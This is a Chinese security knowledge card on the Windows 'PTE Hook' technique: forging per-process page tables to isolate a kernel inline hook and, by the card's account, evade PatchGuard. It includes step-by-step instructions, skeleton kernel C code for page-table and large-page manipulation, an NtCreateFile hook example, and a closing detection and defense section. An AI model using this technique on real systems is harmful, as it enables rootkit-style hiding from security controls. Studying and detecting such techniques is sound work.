---
id: code-analysis-reverse-windows-pte-hook-page-table-isolation-inline-hook
title: PTE Hook：通过 PML4/PDPT/PD/PT 页表重映射实现进程隔离的 Windows 内核函数 inline Hook
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: pte-hook-page-table-isolation-inline-hook
aliases:
- PTE Hook
- 页表重映射 Hook
- 进程隔离内核 Hook
- PML4 页表伪造
- PatchGuard 规避 Hook
- 大页拆分 4K
- Windows 内核 inline hook
tags:
- windows
- kernel
- pte
- page-table
- hook
- patchguard
- rootkit
- driver
- inline-hook
- tlb
- x64
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V216
  verified_at: '2026-11-07T04:43:53+08:00'
  notes: 已对照原文与2张图核对：PML4自映射、CR3扫描找自映射项、PDPT/PD/PT伪造、大页拆分、G位/TLB刷新、14字节绝对跳转+trampoline、Hook NtCreateFile返回ACCESS_DENIED均与原文一致；img02为MyHook.txt.txt被拒绝（Notepad自动加.txt，仍命中wcsstr子串）。已按原文补全HookNtCreateFile的UNICODE_STRING复制与零终止逻辑（原PoC直接对Buffer用wcsstr有越界风险）。未验证点：驱动代码含省略且未编译/运行，6小时未触发PG为原文特定环境结果；非组件漏洞无版本；frontmatter无sources/source_url。dup-scan pair 22 与 PTE Walk 检测卡为攻防不同方向，均保留。
---

## 一句话结论

常规内核 inline Hook 直接改写共享的内核代码页，所有进程都会看到修改，容易被 PatchGuard 的全局校验发现；PTE Hook 先把目标进程的 PML4 表项替换为伪造的 PDPT/PD/PT 链，只在该进程地址空间内把目标函数映射到一份被改写过的代码页，再用 inline Hook 框架写入跳转，从而把 Hook 隔离到单个进程（如 `explorer.exe`），在测试环境中可较长时间不触发 PatchGuard。

## 原理

- **x64 四级分页**：48 位有效虚拟地址按 9-9-9-9-12 拆成 PML4、PDPT、PD、PT 索引和页内偏移；CR3 保存当前进程 PML4 的物理基址。CPU 通过 PML4→PDPT→PD→PT→物理页逐级翻译，PTE 是最后一级页表中的 8 字节表项。
- **页表自映射**：Windows 在 PML4 的某一项中存放 PML4 自身的物理基址，设该索引为 `S`。于是虚拟地址 `(S)(S)(S)(S)(0)` 翻译回 PML4 基址，可以像访问普通内存一样读写页表。常用公式：
  - `PML4_VirtualBase = (S << 39) | (S << 30) | (S << 21) | (S << 12)`
  - 目标 VA 的索引为 `a/b/c/d`（PML4/PDPT/PD/PT）时，其 PTE 的虚拟地址为 `(S << 39) | (a << 30) | (b << 21) | (c << 12) | (d << 3)`。
  - 页表基址随机化后 `S` 每次开机不同；可读取 CR3，用 `MmGetVirtualForPhysical(CR3)` 映射 PML4 物理页，遍历该页 512 个 8 字节表项，找到 PFN（`value & 0xFFFFFFFFF000`）等于 CR3 的那一项，其索引即 `S`，页基址即 PML4 的虚拟映射。
- **为什么全局 Hook 会被 PatchGuard 发现**：用户进程的高 256 个 PML4 项共享内核页表；直接修改内核函数所在 PTE/PDE，会影响所有进程，且 PatchGuard 会定期校验内核代码与页表。PTE Hook 的思路是不改共享页表，而是只替换目标进程 PML4 中的某一项，使其指向一套私有的 PDPT/PD/PT，最终指向一份被修改的 4KB 代码页。
- **伪造页表链**：对目标内核函数地址 `F`，计算其 `pml4eindex/pdpteindex/pdeindex/pteindex`；分配连续的 PT、4KB 代码副本页、PD、PDPT 页；复制原页表内容；然后：
  - 伪造 PTE 的 PFN 指向代码副本页；
  - 伪造 PDE 的 PFN 指向伪造 PT，并清除 `large_page`；
  - 伪造 PDPTE 的 PFN 指向伪造 PD；
  - 目标进程 PML4E 的 PFN 指向伪造 PDPT。
  这样只有该进程的地址空间把 `F` 翻译到副本页，其他进程仍走原页表。
- **大页拆分**：内核代码常以 2MB 大页映射，此时 PDE 没有对应的 PT。需要申请一页连续物理内存作为 PT，把原 PDE 的 2MB 区域拆成 512 个 4KB PTE：每个 PTE 继承原 PDE 的标志，`large_page=0`、`global=0`，PFN 设为原起始 PFN + i 的 4KB 切片；再让 PDE 指向新 PT。Windows 物理内存碎片化，开机越久越难申请 2MB 连续内存，因此拆页比直接申请大页更可行。
- **TLB 与 G 位**：TLB 缓存虚拟地址到物理地址的翻译，CR3 切换时通常刷新；但 PTE/PDE 的 `global` 位（G 位）为 1 时，该翻译跨 CR3 切换保留。如果 Hook 页的 G 位不清零，其他进程可能从 TLB 命中被 Hook 的翻译，导致隔离失效。因此要清除伪造 PTE/PDE 的 G 位，并在替换 PML4E 后执行 `__invlpg` 刷新对应 TLB。
- **inline Hook 部分**：隔离完成后，对目标函数开头反汇编，累计至少 14 字节（x64 绝对跳转 `FF 25 00 00 00 00 + 8 字节地址` 的长度）；把原指令复制到 trampoline（跳板），在 trampoline 末尾写回原函数 `F + 已复制长度` 的完整地址（原文用 `push 0; mov [rsp], low32; mov [rsp+4], high32; ret` 构造 64 位跳转）；再用 MDL 写内存方式把 14 字节绝对跳转写到目标函数，绕过只读页保护；最后把 `*oFuncAddr` 指向 trampoline，供 Hook 函数调用原函数。
- **示例**：Hook `explorer.exe` 的 `NtCreateFile`，在 Hook 函数中检查 `ObjectAttributes->ObjectName`，命中 `MyHook.txt` 就返回 `STATUS_ACCESS_DENIED`，否则调用原函数；测试中打开 `C:\Users\Kernel\Desktop\MyHook.txt` 被拒绝，说明 Hook 只在该进程生效。原文在 Win10 1903、Win10 21H2、Win11 21H2 上运行约 6 小时未出现 PatchGuard 崩溃。
- **为什么能规避 PG（原文观点）**：PatchGuard 主要校验共享的内核代码/页表；PTE Hook 修改的是目标进程私有的页表链和一份副本页，全局内核映射未变。但这不是绝对隐身：页表本身的异常、驱动行为、超visor/EDR 的页表完整性检查仍可能发现。

## 触发条件

- 已获得内核态执行能力（加载签名/未签名驱动，或利用已有内核漏洞），并能调用 `MmAllocateContiguousMemorySpecifyCache`、`MmGetVirtualForPhysical`、`PsLookupProcessByProcessId`、`KeStackAttachProcess` 等内核 API。
- 目标为 x64 Windows（原文测试 Win10 1903/21H2、Win11 21H2），系统启用四级分页；目标进程（如 `explorer.exe`）已运行。
- 目标函数所在页可被隔离（代码页/大页可拆分；需要能申请连续物理页）。
- 驱动未触发 PatchGuard 的其他校验；测试环境未启用会拦截页表修改的 HVCI/超visor 监控。
- 拥有目标进程的 EPROCESS 引用与附加权限（内核态本身即可）。

## 利用步骤

1. 读取 CR3，定位当前 PML4 物理页并找到自映射索引 `S`（或直接用 `pa_to_va(CR3.PFN * PAGE_SIZE)` 取得 PML4 虚拟映射）。
2. 计算目标函数地址 `F` 的 PML4/PDPT/PD/PT 索引；用自映射公式或 `getPagesTable` 取得对应的 PML4E/PDPTE/PDE/PTE 指针。
3. 分配连续物理页：伪造 PT、代码副本页（4KB）、伪造 PD、伪造 PDPT。
4. 若目标 PDE 是大页，申请一页连续内存作为新 PT，按 4KB 拆分原 2MB 大页；否则复制原 PT 页。
5. 复制原 4KB 代码页到副本页；复制原 PD/PDPT 页到伪造页。
6. 关中断，按 PTE→PDE→PDPTE→PML4E 的顺序改写 PFN，使目标进程 PML4E 指向伪造 PDPT；清除 G 位，`__invlpg` 刷新 TLB，开中断。
7. 用 inline Hook 框架：反汇编目标函数开头 ≥14 字节，构造 trampoline 并写回原函数后半段；用 MDL 写内存把 14 字节绝对跳转写到目标函数；保存 trampoline 地址作为原函数指针。
8. 在 Hook 函数中实现过滤/监控逻辑，调用原函数指针继续原流程；测试目标进程行为与其他进程是否不受影响。

## PoC

页表自映射与目标 PTE 定位（伪代码，按原文公式整理）：

```c
// 读取 CR3，扫描 PML4 物理页找到自映射项
ULONG64 GetPml4Base() {
    PHYSICAL_ADDRESS cr3 = { .QuadPart = __readcr3() };
    PULONG64 p = (PULONG64)MmGetVirtualForPhysical(cr3);
    for (int i = 0; i < 512; i++) {
        if ((p[i] & 0xFFFFFFFFF000) == cr3.QuadPart)
            return (ULONG64)&p[i] & 0xFFFFFFFFFFFFF000; // PML4 页虚拟基址
    }
    return 0;
}

// 目标 VA 的 PTE 虚拟地址（S 为自映射索引，a/b/c/d 为四级索引）
// PTE_VA = (S<<39)|(a<<30)|(b<<21)|(c<<12)|(d<<3)
```

2MB 大页拆分为 512 个 4KB PTE：

```c
bool splitLargePages(pde_64* in_pde, pde_64* out_pde) {
    PHYSICAL_ADDRESS max = { .QuadPart = MAXULONG64 }, low = { .QuadPart = 0 };
    pt_entry_64* pt = (pt_entry_64*)MmAllocateContiguousMemorySpecifyCache(
        PAGE_SIZE, low, max, low, MmCached);
    if (!pt) return false;

    UINT64 start_pfn = in_pde->page_frame_number;
    for (int i = 0; i < 512; i++) {
        pt[i].flags = in_pde->flags;
        pt[i].large_page = 0;
        pt[i].global = 0;
        pt[i].page_frame_number = start_pfn + i;
    }
    out_pde->flags = in_pde->flags;
    out_pde->large_page = 0;
    out_pde->page_frame_number = va_to_pa(pt) / PAGE_SIZE;
    return true;
}
```

页表隔离与 PML4E 替换（核心步骤）：

```c
bool isolationPageTable(cr3 cr3_reg, void* replaceAlignAddr, pde_64* splitPDE) {
    uint64_t *vaPt, *va4kb, *vaPdt, *vaPdpt, *vaPml4t;
    // MmAllocateContiguousMemorySpecifyCache 分配 vaPt/va4kb/vaPdt/vaPdpt
    vaPml4t = (uint64_t*)pa_to_va(cr3_reg.address_of_page_directory * PAGE_SIZE);

    PTE_TABLE table = { .LineAddress = replaceAlignAddr };
    getPagesTable(table); // 自映射公式取 PTE/PDE/PDPTE/PML4E 指针

    UINT64 pml4eindex = ((uint64_t)replaceAlignAddr & 0x0000FF8000000000) >> 39;
    UINT64 pdpteindex = ((uint64_t)replaceAlignAddr & 0x0000007FC0000000) >> 30;
    UINT64 pdeindex   = ((uint64_t)replaceAlignAddr & 0x000000003FE00000) >> 21;
    UINT64 pteindex   = ((uint64_t)replaceAlignAddr & 0x00000000001FF000) >> 12;

    if (table.PdeAddress->large_page) {
        vaPt = (uint64_t*)pa_to_va(splitPDE->page_frame_number * PAGE_SIZE);
    } else {
        memcpy(vaPt, table.PteAddress - pteindex, PAGE_SIZE);
    }
    memcpy(va4kb, replaceAlignAddr, PAGE_SIZE);
    memcpy(vaPdt, table.PdeAddress - pdeindex, PAGE_SIZE);
    memcpy(vaPdpt, table.PdpteAddress - pdpteindex, PAGE_SIZE);

    _disable();
    ((pte_64*)&vaPt[pteindex])->page_frame_number = va_to_pa(va4kb) / PAGE_SIZE;
    ((pde_64*)&vaPdt[pdeindex])->page_frame_number = va_to_pa(vaPt) / PAGE_SIZE;
    ((pde_64*)&vaPdt[pdeindex])->large_page = 0;
    ((pdpte_64*)&vaPdpt[pdpteindex])->page_frame_number = va_to_pa(vaPdt) / PAGE_SIZE;
    ((pml4e_64*)&vaPml4t[pml4eindex])->page_frame_number = va_to_pa(vaPdpt) / PAGE_SIZE;
    __invlpg(&vaPml4t[pml4eindex]);
    _enable();
    return true;
}
```

inline Hook 与 NtCreateFile 过滤示例：

```c
NTSTATUS HookNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess,
                          POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock,
                          PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess,
                          ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength) {
    if (ObjectAttributes && ObjectAttributes->ObjectName && ObjectAttributes->ObjectName->Buffer) {
        wchar_t *name = (wchar_t*)ExAllocatePoolWithTag(NonPagedPool,
            ObjectAttributes->ObjectName->Length + sizeof(wchar_t), 'name');
        RtlZeroMemory(name, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
        RtlCopyMemory(name, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);
        if (wcsstr(name, L"MyHook.txt")) {
            ExFreePool(name);
            return STATUS_ACCESS_DENIED;
        }
        ExFreePool(name);
    }
    return g_OriginNtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock,
                                AllocationSize, FileAttributes, ShareAccess, CreateDisposition,
                                CreateOptions, EaBuffer, EaLength);
}
```

> 原文代码含省略与自定义结构（PTE_TABLE、getPagesTable、MDLWriteMemory 等），上述为按原文整理的核心骨架，未在本机编译/运行。

## 变体与关联

- 变体：Hook 其他内核函数（文件、注册表、进程/线程创建、网络）以实现隐藏或过滤；只对指定进程生效，适合隐藏特定进程的文件/注册表操作。
- 变体：不替换 PML4E，而是克隆整个进程页表（如 CR3 切换时使用私有 PML4），或在 hypervisor 层做 EPT Hook；检测面与实现复杂度不同。
- 变体：大页拆分也可用于其他需要 4KB 粒度修改的页表操作（如 Dirty Pagetable 利用中的 PTE 重叠）。
- 关联卡片：[[binary-pwn-kernel-dirty-pagetable-pmd-pte-overlap-physical-rw]]（页表页 double free 与 PMD/PTE 重叠，偏利用）、[[code-analysis-reverse-windows-kisystemcall64-lstar-msr-hook]]（另一种内核 Hook/系统调用拦截思路）、[[code-analysis-reverse-windows-iat-hook-install-messagebox]]（用户态 IAT Hook）、[[mobile-android-kpm-inline-hook-arm64-trampoline-relocation]]（ARM64 内核 inline hook 的 trampoline 重定位）。

## 检测与防御

- **PatchGuard/HVCI**：启用 HVCI、Secure Boot、驱动签名强制与内核代码完整性；PatchGuard 会校验关键内核结构与代码，但对进程私有页表的修改不一定覆盖，需结合 hypervisor/EDR 的页表完整性监控。
- **驱动与内存行为**：监控未签名/低信誉驱动加载；关注 `MmAllocateContiguousMemorySpecifyCache`、`MmGetVirtualForPhysical`、`__readcr3`/`__writecr3`、`__invlpg`、MDL 写只读页等组合；页表页出现异常 PFN 指向非映像页。
- **进程级异常**：单个进程的系统调用行为与其他进程不一致（如同一 `NtCreateFile` 在 `explorer.exe` 被拒绝、其他进程正常），可能是进程隔离 Hook 的信号；对关键进程做调用链/返回地址校验。
- **TLB/页表扫描**：定期比对内核函数在目标进程与其他进程的页表翻译结果；检查 PML4E 是否指向非预期的 PDPT 页；检查大页被拆分为 4KB 的异常。
- **防御**：内核攻击面最小化，禁用不必要的驱动加载；启用 VBS/HVCI 与内核 CFG；对高价值进程使用受保护进程轻量级（PPL）或 hypervisor 保护；发现可疑驱动后隔离主机并做内存取证。
- **边界**：原文的“6 小时未触发 PG”是特定测试环境的结果，不代表所有 Windows 版本/配置都安全；PTE Hook 仍留下页表与驱动层面的痕迹。
